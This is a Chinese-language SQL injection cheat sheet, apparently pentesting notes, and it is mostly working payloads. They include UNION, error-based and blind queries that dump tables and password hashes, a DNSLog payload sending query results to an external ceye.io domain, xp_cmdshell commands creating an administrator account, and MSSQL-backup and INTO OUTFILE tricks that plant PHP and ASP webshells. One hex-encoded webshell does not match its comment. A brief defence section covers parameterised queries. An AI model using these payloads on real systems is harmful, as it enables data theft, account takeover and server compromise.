## 概述

SQL注入漏洞主要形成的原因是在数据交互中，前端的数据传入到后端处理时，没有进行严格的输入验证和过滤，导致用户传入的“数据”被拼接到SQL语句中，并被数据库系统当作SQL语句的一部分来执行。这可能导致数据库信息泄露、数据损坏、甚至服务器被控制。

**示例 Payload:**

*   `id=1 or 1=1` (常用于绕过认证或条件判断)

## 检测方法

1.  **基础探测:**
    *   输入异常字符/字符串，观察响应：`id=1 sadasda`
    *   使用单引号 `'`、双引号 `"` 或注释符 `--`、`#` 探测。
2.  **逻辑判断:**
    *   `id=1 and 1=1` (预期返回正常)
    *   `id=1 and 1=2` (预期返回异常或无结果)
    *   如果响应不同，则可能存在注入。
3.  **报错探测:**
    *   尝试引发数据库错误，观察错误信息：`id=1 union select 1,2,3,4` (需匹配列数)
    *   错误信息可能暴露数据库类型、版本、表结构等。
4.  **联合查询探测:**
    *   使用 `UNION SELECT` 结合 `GROUP_CONCAT()` 或 `CONCAT()` 等函数合并查询结果。

## SQL注入分类

### 按数据类型分类

1.  **数字型 (Numeric):**
    *   `WHERE id = 1`
    *   通常不需要闭合引号。
    *   Payload: `id=1 AND 1=2`
2.  **字符型 (String):**
    *   `WHERE id = '1'` 或 `WHERE id = "1"`
    *   需要闭合引号（单引号或双引号），并注释掉后续语句。
    *   Payload: `id=1' AND '1'='1 --+`
3.  **搜索型 (Search/LIKE):**
    *   `WHERE column LIKE '%keyword%'`
    *   需要闭合引号和 `%` 通配符，并注释掉后续语句。
    *   Payload: `keyword%' AND 1=1 --+` 或 `keyword%') AND 1=1 --+`
4.  **括号型 (Parenthesized):**
    *   `WHERE id = ('1')` 或类似不规范结构。
    *   需要根据具体情况闭合括号和引号。触发报错观察闭合方式。
    *   Payload: `1') AND ('1'='1 --+`

### 按HTTP请求方法分类

SQL注入可能存在于任何向后端传递参数的地方。

1.  **GET请求:**
    *   参数在URL中，可见且易受URL编码影响。
    *   可以直接在浏览器地址栏或工具中修改。
2.  **POST请求:**
    *   参数在请求主体 (Request Body) 中，不可见于URL，不易受URL编码影响。
    *   通常需要使用代理工具（如Burp Suite）抓包修改。
3.  **请求头 (HTTP Headers):**
    *   `Cookie`, `User-Agent`, `Referer` 等请求头字段如果被后端代码引用并拼接到SQL语句中，也可能存在注入点。

### 按攻击类型分类

1.  **联合查询注入 (UNION Attack):**
    *   **概述:** 使用 `UNION` 操作符连接额外的 `SELECT` 语句，在原始查询结果后附加其他数据。常与 `ORDER BY` 语句结合，用于确定列数。
    *   **关键库/表 (MySQL):**
        *   `information_schema`: 存储数据库元数据（库名、表名、列名等）的系统数据库。
        *   `information_schema.schemata`: 存储所有数据库名称。
        *   `information_schema.tables`: 存储所有表名及其所属数据库。
        *   `information_schema.columns`: 存储所有列名及其所属表、库。
        *   `mysql.user`: 可能存储数据库用户信息（在旧版本或特定配置下）。
2.  **报错注入 (Error-based):**
    *   **概述:** 利用数据库的报错机制，使查询结果在错误信息中显示出来。
    *   **常用函数 (MySQL):**
        *   `updatexml(XML_document, XPath_string, new_value)`: 通过构造非法的XPath（第二个参数）使其报错。
        *   `extractvalue(XML_frag, XPath_expr)`: 类似 `updatexml`，通过构造非法XPath（第二个参数）报错。
        *   `floor()`: 结合 `rand()`, `count(*)`, `group by` 构造重复键错误。
    *   **常用辅助函数:**
        *   `concat()`: 连接字符串。
        *   `rand()`: 生成随机数。
        *   `floor()`: 向下取整。
        *   `group by`: 分组。
    *   **Payload 示例 (updatexml/extractvalue):**
        ```sql
        -- 爆版本
        k%' or updatexml(1,concat(0x7e,(select @@version),0x7e),1) #
        k%' or extractvalue(1,concat(0x7e,(select @@version),0x7e)) #
        -- 爆库名
        k' and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1) #
        -- 爆表名 (使用 limit 逐行获取)
        k'and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='数据库名' limit 0,1)),0) #
        -- 爆列名
        k' and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name='表名' limit 0,1)),0) #
        -- 爆数据
        k' and updatexml(1,concat(0x7e,(select password from users limit 0,1)),0) #
        ```
    *   **Payload 示例 (floor):**
        ```sql
        select count(*) from information_schema.tables group by concat((select version()),floor(rand(0)*2));
        ```
    *   **INSERT/UPDATE 语句报错注入:**
        *   在 `INSERT` 或 `UPDATE` 语句的值部分注入，需构造 `or` 使语句闭合。
        *   示例: `k' or updatexml(1,concat(0x7e,(命令)),0) or'`
    *   **HTTP头/Cookie 报错注入:**
        *   如果 `User-Agent` 或 `Cookie` 值被用于SQL查询，可尝试注入。
        *   示例 (User-Agent): `User-Agent: Mozilla' or updatexml(1,concat(0x7e,database()),0) or '`
        *   示例 (Cookie): `Cookie: ant[uname]=admin' and updatexml(1,concat(0x7e,database()),0) #`
3.  **布尔盲注 (Boolean-based Blind):**
    *   **概述:** 页面仅返回“真”和“假”两种不同状态（如“查询成功”/“查询失败”），无法直接获取数据。通过构造逻辑判断语句，逐个字符猜测信息。
    *   **常用函数:**
        *   `length()`: 获取字符串长度。
        *   `substr()` / `substring()` / `mid()`: 截取字符串。
        *   `ascii()` / `ord()`: 获取字符的ASCII码。
    *   **Payload 示例:**
        ```sql
        -- 判断是否存在注入
        ' and 1=1 #
        ' and 1=2 #
        -- 猜解数据库名长度
        ' and length(database()) = 5 #
        -- 猜解数据库名第一个字符的ASCII码
        ' and ascii(substr(database(),1,1)) = 112 # (p)
        -- 猜解数据库名第一个字符
        ' and substr(database(),1,1) = 'p' #
        ```
    *   **工具:** Burp Suite Intruder 可用于自动化布尔盲注。
4.  **时间盲注 (Time-based Blind):**
    *   **概述:** 页面无论真假都返回相同内容，无法通过页面状态判断。通过构造条件语句，如果条件为真则执行 `sleep()` 或类似耗时操作，通过响应时间判断条件真假。
    *   **常用函数:**
        *   `sleep(seconds)`: 使数据库暂停指定秒数。
        *   `if(condition, true_expr, false_expr)`: 条件判断。
        *   `benchmark(count, expr)`: 重复执行表达式 `count` 次（高负载）。
    *   **Payload 示例:**
        ```sql
        -- 判断是否存在注入 (如果存在，页面延迟5秒)
        ' and if(1=1, sleep(5), 0) #
        -- 猜解数据库名第一个字符
        ' and if(ascii(substr(database(),1,1)) = 112, sleep(5), 0) #
        -- 使用 benchmark
        ' AND benchmark(5000000, MD5('A')) # (执行大量MD5计算)
        ```
5.  **DNSLog盲注 (DNSLog-based Blind / Out-of-Band):**
    *   **概述:** 利用数据库函数（如MySQL的`load_file()`）发起DNS查询请求，将查询的数据作为子域名拼接到特定的DNSLog平台地址上。通过查看DNSLog平台的解析记录来获取数据。
    *   **前提条件:**
        *   目标数据库服务器能访问外网。
        *   数据库用户具有执行相关函数（如`load_file()`）的权限。
        *   (MySQL on Windows) `secure_file_priv` 配置允许加载文件（通常需为空 `""` 或指定特定目录，`NULL`表示禁止）。
    *   **方法:**
        1.  注册一个DNSLog平台账号（如 `ceye.io`, `dnslog.cn`）获取一个唯一子域名 `your_identifier.ceye.io`。
        2.  构造Payload，将要查询的数据（如`database()`、`version()`）拼接到子域名前。
    *   **Payload 示例 (MySQL on Windows):**
        ```sql
        -- 将数据库版本发送到DNSLog
        select load_file(concat('\\\\',(select version()),'.your_identifier.ceye.io\\abc'));
        -- 将库名(可能含特殊字符,用hex编码)发送到DNSLog
        select load_file(concat('\\\\',(select hex(database()) limit 0,1),'.your_identifier.ceye.io\\abc'));
        ```
    *   **注意:** 特殊字符可能无法直接作为域名，常用`hex()`编码或`replace()`替换。

## 特定注入技术

### 宽字节注入 (Wide Byte Injection)

*   **原理:** 当数据库使用GBK等宽字节编码时，某些函数（如PHP的`addslashes()`）为了防止注入，会在单引号 `'` 前添加反斜杠 `\`，变为 `\'`。其十六进制为 `%5c%27`。攻击者可以在单引号前添加一个大于128的ASCII码字符（如 `%df`），构成 `%df%5c%27`。GBK解码时会将 `%df%5c` 视为一个汉字（如“運”），从而“吃掉”反斜杠，留下单独的单引号 `'`，绕过转义。
*   **条件:**
    *   数据库连接使用宽字节编码（如GBK）。
    *   PHP等脚本语言使用了 `addslashes()` 或类似转义函数，但未正确设置字符集（如使用 `mysql_set_charset('gbk', $conn)`）。
*   **检测与利用:**
    *   黑盒：在参数后添加 `%df'` 测试，如 `id=1%df'`。
    *   白盒：检查代码确认编码和转义函数使用情况。
*   **防御:**
    *   使用UTF-8编码。
    *   正确设置数据库连接字符集（如 `mysql_set_charset('utf8', $conn)` 或 PDO 中设置）。
    *   使用 `mysql_real_escape_string()` 并确保连接字符集设置正确。
    *   设置MySQL连接参数 `character_set_client=binary`。

### 二次编码注入 (Double Encoding Injection)

*   **原理:** Web应用程序在处理用户输入时，可能存在多次URL解码或编码处理。例如，用户输入 `%2527` (`%25`是`%`的URL编码)，第一次解码后变为 `%27` (`'`的URL编码)。如果此时进行了SQL注入防护（如 `addslashes`），它可能不会转义 `%27`。但在后续处理中（如再次 `urldecode()`），`%27` 被解码为单引号 `'`，从而可能导致注入。
*   **条件:** 代码中存在不当的多次编解码处理，且转义函数在第一次解码后、第二次解码前执行。
*   **检测与利用:** 输入 `%2527` 或其他特殊字符的双重编码形式。
*   **防御:** 统一规范编解码流程，确保在最终执行SQL前进行有效的转义或使用参数化查询。

### 二次注入 (Second Order Injection)

*   **原理:** 攻击者提交的包含恶意SQL代码的数据，在第一次存入数据库时被成功转义（或看似无害），存储完成。当应用程序从数据库中取出这些“可信”的数据，并未再次进行充分的检查和转义，就直接拼接到新的SQL查询语句中执行时，导致注入发生。
*   **场景举例:**
    1.  **用户名注册:** 用户注册名为 `admin'#`。注册时被转义写入数据库。当该用户修改密码时，后端查询可能是 `UPDATE users SET password='newpass' WHERE username='admin'#' AND old_password='oldpass'`。`#`注释了后续条件，导致直接修改了`admin`用户的密码。
    2.  **数据显示:** 用户在个人信息中写入 `xx' union select database(), 2, 3 #`。写入时被转义。当其他用户查看此信息，或后台管理页面显示此信息时，如果直接将数据库取出的数据显示在页面上，或者更糟的是，将取出的数据用于另一个SQL查询，就可能触发注入。
*   **防御:**
    *   对所有外部输入（即使是存入数据库前已转义的）在取出并再次使用于SQL查询时，仍要进行严格的验证和转义，或使用参数化查询。
    *   原则上不信任任何从数据库取出的数据，视同外部输入处理。

## SQL注入防御

1.  **代码层面:**
    *   **输入验证与过滤:** 对用户输入进行严格的类型、格式、长度检查和非法字符过滤。使用白名单验证。
    *   **转义:** 对进入SQL语句的特殊字符（如 `'`, `"`, `\`, NUL 等）进行转义。使用数据库或语言提供的专用转义函数。
    *   **参数化查询 (Parameterized Queries / Prepared Statements):** **强烈推荐**。将SQL语句的结构和用户输入的数据分开处理。数据库驱动会处理数据的转义，从根本上防止将数据当作代码执行。
        *   **PHP PDO:** 使用 `prepare()` 和 `execute()` 方法。
        *   **Java JDBC:** 使用 `PreparedStatement`。
        *   **Python DB-API:** 使用 `execute()` 方法的第二个参数传递参数元组或字典。
    *   **ORM框架:** 多数现代ORM框架（如Hibernate, SQLAlchemy, Django ORM, Eloquent）默认使用参数化查询，但需注意避免使用拼接字符串构建查询的API。
2.  **网络层面:**
    *   **Web应用防火墙 (WAF):** 部署WAF设备或软件，启用防SQL注入策略。WAF可以检测和拦截已知的注入攻击模式。
    *   **云防护服务:** 使用阿里云盾、腾讯云WAF、Cloudflare等云服务提供商的防护功能。
3.  **数据库层面:**
    *   **最小权限原则:** Web应用连接数据库的用户应只授予必需的最低权限（如仅对特定表有SELECT, INSERT, UPDATE, DELETE权限），避免使用root或sa等高权限账户。
    *   **关闭不必要的错误回显:** 不要在生产环境中向用户显示详细的数据库错误信息。

## 特定数据库注入

### Access数据库注入

*   **特点:** 没有 `information_schema` 这样的元数据库。注入主要靠猜解表名和列名。
*   **常用探测语句:**
    *   猜表名: `id=1 and exists (select * from admin)`
    *   猜列名: `id=1 and exists (select username from admin)`
    *   猜列数据类型/长度: `id=1 and (select top 1 len(username) from admin) > 5`
    *   猜列数据内容 (逐字): `id=1 and (select top 1 asc(mid(username,1,1)) from admin) > 97`
*   **工具:** Havij, Pangolin (老旧工具，需谨慎使用)。

### MSSQL数据库注入

*   **特点:** 权限体系复杂（`sysadmin`, `db_owner`, `public`）。拥有强大的存储过程（如 `xp_cmdshell`），高权限下可执行系统命令。
*   **系统对象:** `sysobjects` (存储对象信息), `syscolumns` (存储列信息)。
*   **权限判断:**
    *   `and 1=(select is_srvrolemember('sysadmin')) --` (判断是否为sysadmin)
    *   `and 1=(select is_member('db_owner')) --` (判断是否为db_owner)
    *   `and 1=(select is_member('public')) --` (判断是否为public)
*   **信息获取:**
    *   版本: `and @@version > 0 --` (通过报错)
    *   当前用户: `and user > 0 --` (通过报错)
    *   当前库名: `and db_name() > 0 --` 或 `and 1=convert(int, db_name()) --`
    *   多行查询支持: `;declare @d int --`
    *   子查询支持: `and (select count(1) from sysobjects) >= 0 --`
*   **SA (sysadmin) 权限利用:**
    *   检查 `xp_cmdshell` 是否存在/启用: `and 1=(select count(*) from master.dbo.sysobjects where name = 'xp_cmdshell') --`
    *   启用 `xp_cmdshell` (如果被禁用):
        ```sql
        ;exec sp_configure 'show advanced options', 1;reconfigure;exec sp_configure 'xp_cmdshell', 1;reconfigure;--
        ```
    *   执行系统命令:
        ```sql
        ;exec master..xp_cmdshell 'net user hacker pass /add';--
        ;exec master..xp_cmdshell 'net localgroup administrators hacker /add';--
        ```
    *   其他常用存储过程: `xp_regread`, `xp_regwrite`, `xp_dirtree`, `xp_servicecontrol` 等。
*   **DB_OWNER 权限利用 (获取WebShell):**
    *   **思路:** 通常无法直接执行 `xp_cmdshell`。利用数据库备份功能将包含WebShell代码的表备份为Web脚本文件（如 .asp, .aspx）。
    *   **步骤:**
        1.  **查找Web目录:**
            *   利用报错信息、搜索引擎。
            *   利用 `xp_dirtree` 存储过程列目录 (可能需要 `public` 权限)。
                ```sql
                -- 创建临时表存目录结构
                drop table if exists dirtree; create table dirtree (id int identity(1,1), L1_subdirectory nvarchar(512), L2_depth int, L3_file int);
                -- 列出 C 盘目录
                insert into dirtree (L1_subdirectory, L2_depth, L3_file) exec master..xp_dirtree 'C:', 1, 1;
                -- 逐行读取目录 (需调整id)
                and (select L1_subdirectory from dirtree where id=1) > 0 --
                ```
        2.  **创建包含WebShell的表:**
            ```sql
            create table webshell_tmp (code image);
            insert into webshell_tmp (code) values (0x3C256578656375746528726571756573742822636D64222929253E); -- ASPX一句话木马 <%@ Page Language="Jscript"%><%eval(Request.Item["pass"],"unsafe");%> 的Hex编码
            ```
        3.  **差异备份/日志备份:** (需要数据库之前有完整备份，且恢复模式为Full或Bulk-logged)
            ```sql
            -- 方法一: 日志备份 (需先改恢复模式, 事后改回)
            alter database [数据库名] set recovery full; --
            backup log [数据库名] to disk = 'C:\inetpub\wwwroot\shell.asp' with init; -- 先清空日志
            backup log [数据库名] to disk = 'C:\inetpub\wwwroot\shell.asp'; -- 备份含木马的日志
            alter database [数据库名] set recovery simple; -- 改回简单模式
            -- 方法二: 差异备份 (需先有完整备份)
            backup database [数据库名] to disk='C:\inetpub\wwwroot\shell.asp' with differential, format;
            ```
        4.  连接WebShell (如使用中国菜刀、AntSword)。
*   **PUBLIC 权限利用:**
    *   只能进行信息探测，猜解表名、列名、数据。
    *   获取库名: `and db_name()=0 --` (报错)
    *   猜表名: `and (select top 1 name from sysobjects where xtype='U' and name not in ('已知表1','已知表2')) > 0 --` (逐个猜)
    *   猜列名 (结合 `having` 和 `group by` 报错): `and 1=1 group by table.col1 having 1=1 --` (如果成功，说明col1存在)

### MySQL数据库注入

*   **特点:** `information_schema` 库是信息获取的核心。权限管理相对简单（用户@主机）。`load_file()`, `into outfile` 可用于读写文件。
*   **信息获取:**
    *   版本: `version()`, `@@version`
    *   用户: `user()`, `current_user()`
    *   库名: `database()`
    *   操作系统: `@@version_compile_os`
    *   所有库名: `select group_concat(schema_name) from information_schema.schemata`
    *   指定库所有表名: `select group_concat(table_name) from information_schema.tables where table_schema='数据库名'` (或 `database()`)
    *   指定库、表所有列名: `select group_concat(column_name) from information_schema.columns where table_schema='数据库名' and table_name='表名'`
    *   获取数据: `select concat(col1, 0x3a, col2) from 库名.表名 limit 0,1` (0x3a是冒号:)
    *   统计行数: `select count(*) from 库名.表名`
*   **获取用户密码 (需要相应权限):**
    *   MySQL < 5.7: `select concat_ws(':', user, password) from mysql.user limit 0,1`
    *   MySQL >= 5.7: `select concat_ws(':', user, authentication_string) from mysql.user limit 0,1`
*   **文件读写 (需要FILE权限和配置允许):**
    *   **读取文件:**
        ```sql
        ' union select 1, load_file('/etc/passwd') # -- Linux
        ' union select 1, load_file('C:/Windows/win.ini') # -- Windows
        ```
        *   `secure_file_priv` 配置:
            *   `NULL`: 禁止读写。
            *   `""`: 允许在任意位置读写（不安全）。
            *   `/path/to/dir/`: 只允许在指定目录下读写。
    *   **写入WebShell:**
        ```sql
        ' union select 1, '<?php @eval($_POST["cmd"]);?>' into outfile '/var/www/html/shell.php' #
        ' union select 1, 0x3C3F70687020406576616C28245F504F53545B22636D64225D293B3F3E into outfile 'C:/xampp/htdocs/shell.php' # (使用Hex编码)
        ```
        *   需要知道Web目录的绝对路径。
        *   目标目录需要MySQL运行用户有写入权限。
        *   `secure_file_priv` 配置允许写入该目录。
*   **查找Web路径方法:**
    *   利用报错信息（如脚本出错页面，可能包含路径）。
    *   搜索引擎搜索报错信息: `error site:target.com`, `warning site:target.com`。
    *   读取配置文件 (需 `load_file` 权限):
        *   **Windows:** `C:/Windows/php.ini`, `C:/Windows/my.ini`, `C:/xampp/apache/conf/httpd.conf`, `C:/Windows/System32/inetsrv/MetaBase.xml`
        *   **Linux:** `/etc/php.ini`, `/etc/my.cnf`, `/etc/httpd/conf/httpd.conf`, `/etc/nginx/nginx.conf`, `/usr/local/apache2/conf/httpd.conf`, `/var/log/nginx/error.log` (日志可能泄露)
    *   利用 CMS 或框架的探针、后台功能查看。

## 常用函数 (MySQL)

*   **系统信息:**
    *   `version()` / `@@version`: 数据库版本。
    *   `database()`: 当前数据库名。
    *   `user()` / `current_user()` / `system_user()`: 当前用户。
    *   `@@datadir`: 数据存储目录。
    *   `@@basedir`: MySQL安装目录。
    *   `@@version_compile_os`: 操作系统。
    *   `sleep(seconds)`: 延时。
    *   `benchmark(count, expr)`: 重复执行表达式。
*   **字符串处理:**
    *   `concat(str1, str2, ...)`: 无分隔符连接。
    *   `concat_ws(separator, str1, str2, ...)`: 带分隔符连接。
    *   `group_concat(col)`: 将分组后的某列值用逗号连接。
    *   `length(str)`: 字符串字节长度。
    *   `char_length(str)`: 字符串字符长度。
    *   `substr(str, pos, len)` / `substring(...)` / `mid(...)`: 截取子串。
    *   `left(str, len)` / `right(str, len)`: 取左/右子串。
    *   `ascii(char)` / `ord(char)`: 字符转ASCII码。
    *   `char(num1, num2, ...)`: ASCII码转字符。
    *   `hex(str)` / `unhex(hex_str)`: 字符串与十六进制互转。
    *   `load_file(filepath)`: 读取文件内容。
    *   `into outfile 'filepath'` / `into dumpfile 'filepath'`: 写入文件。
*   **逻辑与控制:**
    *   `if(condition, true_val, false_val)`: 条件判断。
    *   `ifnull(expr1, expr2)`: 如果expr1不为NULL则返回expr1，否则返回expr2。
    *   `strcmp(str1, str2)`: 比较字符串 (相等返回0, str1>str2返回1, str1<str2返回-1)。
*   **数学:**
    *   `floor(num)`: 向下取整。
    *   `rand()`: 0到1之间的随机浮点数。
    *   `count(*)`: 统计行数。

## 手工注入步骤与技巧

1.  **寻找注入点:**
    *   识别所有用户可控的输入点（URL参数、POST数据、HTTP头、Cookie等）。
    *   重点关注与数据库交互的动态页面，特别是ID、搜索关键字、排序字段等参数。
    *   URL形式: `.../page.php?id=1`, `.../search?q=keyword`, `.../items/1`, `.../news.php?category=tech&page=2`。
2.  **判断注入类型与闭合方式:**
    *   **单引号法:** 加 `'`，看是否报错。
    *   **逻辑判断法:** 加 `and 1=1` 和 `and 1=2`，看页面响应是否不同。
    *   **组合尝试:**
        *   `' and 1=1 --+` / `' and 1=2 --+`
        *   `" and 1=1 --+` / `" and 1=2 --+`
        *   `) and 1=1 --+` / `) and 1=2 --+`
        *   `') and 1=1 --+` / `') and 1=2 --+`
        *   `") and 1=1 --+` / `") and 1=2 --+`
    *   **注释符:** `-- ` (注意后面有空格), `#` (URL编码为 `%23`), `;%00` (空字节截断, 特定场景)。
    *   **报错观察:** 故意构造错误语句（如 `union select 1` 列数不匹配），观察报错信息获取闭合提示。
3.  **猜解列数 (UNION注入):**
    *   `order by 1 --+`
    *   `order by 2 --+`
    *   ... 逐步增加数字，直到页面报错，报错前最后一个成功的数字即为列数。
4.  **确定显示位 (UNION注入):**
    *   假设有3列：`union select 1,2,3 --+`
    *   或者：`union select null,null,null --+`
    *   或者：`union select 'a','b','c' --+`
    *   观察页面哪个位置显示了注入的数字或字符，该位置即可用于显示查询结果。
5.  **获取信息:**
    *   利用上一步确定的显示位，替换为查询语句。
    *   **查库名:** `union select 1, database(), 3 --+`
    *   **查表名:** `union select 1, group_concat(table_name), 3 from information_schema.tables where table_schema=database() --+`
    *   **查列名:** `union select 1, group_concat(column_name), 3 from information_schema.columns where table_schema=database() and table_name='users' --+`
    *   **查数据:** `union select 1, group_concat(username, 0x3a, password), 3 from users --+` (0x3a 是冒号)
6.  **盲注探测:**
    *   如果UNION和报错都不可用，尝试布尔盲注或时间盲注。
    *   **布尔:** 构造 `and length(database())=5 --+` 等条件，观察页面真假反馈。
    *   **时间:** 构造 `and if(length(database())=5, sleep(5), 0) --+` 等条件，观察响应时间。
7.  **WAF/过滤绕过:**
    *   大小写混合 (`SeLeCt`)
    *   替换关键字 (`union select` -> `union/**/select`)
    *   编码 (URL编码, Hex编码, Unicode编码)
    *   等价函数/符号 (`and` -> `&&`, `=` -> `like`, `substr` -> `mid`)
    *   内联注释 (`/*! ... */`)
    *   HTTP参数污染 (提交同名参数)
    *   宽字节注入
    *   使用 `sqlmap --tamper`。

[[SQLMAP]]